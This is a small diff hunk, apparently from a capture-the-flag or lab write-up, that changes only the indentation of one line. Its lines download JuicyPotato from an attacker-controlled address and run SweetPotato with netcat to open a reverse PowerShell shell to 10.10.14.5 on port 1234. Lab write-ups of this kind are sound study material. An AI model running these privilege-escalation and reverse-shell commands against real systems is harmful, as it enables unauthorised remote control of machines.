@@ -200,7 +200,7 @@ iwr -uri http://10.10.14.5/juicypotato.exe -OutFile juicy.exe
 
 
 #I have problem with Juicy potato so I use SweetPotato.exe and a nc64.exe binary (netcat)
-.\SweetPotato.exe -p nc64.exe -a "-e powershell 10.10.14.5 1234"
+	.\SweetPotato.exe -p nc64.exe -a "-e powershell 10.10.14.5 1234"
 
   
 ```
